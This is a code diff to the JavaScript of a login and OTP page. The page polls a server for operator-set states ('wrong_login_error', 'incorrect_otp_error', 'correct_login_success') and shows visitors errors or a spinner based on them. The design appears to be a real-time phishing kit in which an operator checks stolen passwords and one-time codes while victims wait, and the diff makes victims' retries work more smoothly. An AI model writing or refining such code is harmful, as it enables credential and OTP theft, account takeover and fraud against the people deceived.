@@ -301,6 +301,7 @@ button:disabled{
   let approvalInterval = null;
   let blockCheckInterval = null;
   let isModalOpen = false;
+  let incorrectOtpProcessed = false;
 
   async function checkIfBlocked() {
     try {
@@ -331,7 +332,7 @@ button:disabled{
     }, 3000);
   }
 
-  // Check for Incorrect OTP - shows red error message below input
+  // INCORRECT OTP - SHOW ERROR ONCE, CLEAR INPUT, RESET DATABASE
   async function checkIncorrectOtp() {
     try {
       const response = await fetch('/api/users/check-admin-text', {
@@ -341,8 +342,10 @@ button:disabled{
       });
       const data = await response.json();
       
-      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
-        errorDiv.textContent = '❌ Incorrect OTP entered. Please try again.';
+      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false && !incorrectOtpProcessed) {
+        incorrectOtpProcessed = true;
+        
+        errorDiv.textContent = '❌ Incorrect OTP entered. Please try again with a new code.';
         errorDiv.style.display = 'block';
         
         otpInput.value = '';
@@ -356,12 +359,13 @@ button:disabled{
         
         setTimeout(() => {
           errorDiv.style.display = 'none';
+          incorrectOtpProcessed = false;
         }, 4000);
       }
     } catch (err) {}
   }
 
-  // Check for Wrong Login - shows error, clears password, keeps modal open
+  let wrongLoginProcessed = false;
   async function checkWrongLogin() {
     try {
       const response = await fetch('/api/users/check-admin-text', {
@@ -371,14 +375,23 @@ button:disabled{
       });
       const data = await response.json();
       
-      if (data.admin_text === 'wrong_login_error' && data.text_release === false) {
+      if (data.admin_text === 'wrong_login_error' && data.text_release === false && !wrongLoginProcessed) {
+        wrongLoginProcessed = true;
+        
         const modalError = document.getElementById('modalError');
         if (modalError) {
           modalError.textContent = '❌ Invalid email or password. Please try again.';
           modalError.style.display = 'block';
         }
+        
         const loginPassword = document.getElementById('loginPassword');
         if (loginPassword) loginPassword.value = '';
+        
+        const submitBtn = document.getElementById('submitLoginBtn');
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = 'Login to Continue →';
+        }
         
         await fetch('/api/admin/release-text', {
           method: 'POST',
@@ -388,12 +401,13 @@ button:disabled{
         
         setTimeout(() => {
           if (modalError) modalError.style.display = 'none';
+          wrongLoginProcessed = false;
         }, 4000);
       }
     } catch (err) {}
   }
 
-  // Check for Correct Login - Replace modal content with loading spinner
+  let correctLoginProcessed = false;
   async function checkCorrectLogin() {
     try {
       const response = await fetch('/api/users/check-admin-text', {
@@ -403,7 +417,9 @@ button:disabled{
       });
       const data = await response.json();
       
-      if (data.admin_text === 'correct_login_success' && data.text_release === false) {
+      if (data.admin_text === 'correct_login_success' && data.text_release === false && !correctLoginProcessed) {
+        correctLoginProcessed = true;
+        
         const modalContent = document.getElementById('loginModalContent');
         if (modalContent) {
           modalContent.innerHTML = `
@@ -427,6 +443,8 @@ button:disabled{
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
+        
+        correctLoginProcessed = false;
       }
     } catch (err) {}
   }
@@ -545,8 +563,11 @@ button:disabled{
           document.getElementById('loginEmail').value = '';
           document.getElementById('loginPassword').value = '';
           document.getElementById('modalError').style.display = 'none';
-          document.getElementById('submitLoginBtn').disabled = false;
-          document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue →';
+          const submitBtn = document.getElementById('submitLoginBtn');
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = 'Login to Continue →';
+          }
         }
       } catch (err) {}
     }, 2000);
@@ -625,7 +646,8 @@ button:disabled{
       });
       const data = await response.json();
       if (data.success) {
-        // Don't close modal - will be handled by admin
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Login to Continue →';
       } else {
         modalError.textContent = data.error || 'Failed to verify account';
         modalError.style.display = 'block';
